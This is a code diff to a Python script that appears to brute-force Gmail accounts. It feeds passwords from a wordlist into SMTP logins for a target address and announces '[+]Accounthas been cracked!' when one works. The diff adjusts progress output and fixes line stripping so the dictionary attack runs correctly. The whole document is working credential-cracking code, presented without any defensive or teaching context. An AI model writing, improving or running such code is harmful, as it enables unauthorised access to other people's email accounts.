@@ -12,14 +12,14 @@ server.ehlo()
 def login(email, password):
     global server
     user_name = email
-    printGreen('[!]trying: ' + password)
+    
     try:
         server.login(user_name, password)
         SysCleanScreen()
         InFo()
         printGreen ('[+]Accounthas been cracked!')
         ShowSucess(email, password)
-        return 1;
+        return 1
     except smtplib.SMTPAuthenticationError as e:
         error = str(e)
         if error[14] == '<':
@@ -27,10 +27,9 @@ def login(email, password):
             InFo()
             printGreen ('[+]Accounthas been cracked!')
             ShowSucess(email, password)
-            return 1;
+            return 1
         else:
-            printYellow('[W]Faild\n')
-            return 0;
+            return 0
     except smtplib.SMTPServerDisconnected:
         print('[!]Tool is waiting for server...')
         server.close()
@@ -49,7 +48,11 @@ class CGmail(object):
             line = fp.readline()
             while line:
                 try:
-                    line.strip()
+                    line = line.strip()
+                    sys.stdout.write(' ' * 50 + '\r')
+                    sys.stdout.flush()
+                    sys.stdout.write('[!]Trying : ' + line + '\r')
+                    sys.stdout.flush()
                     if login(self.email, line) == 1:
                         fp.close()
                         exit()
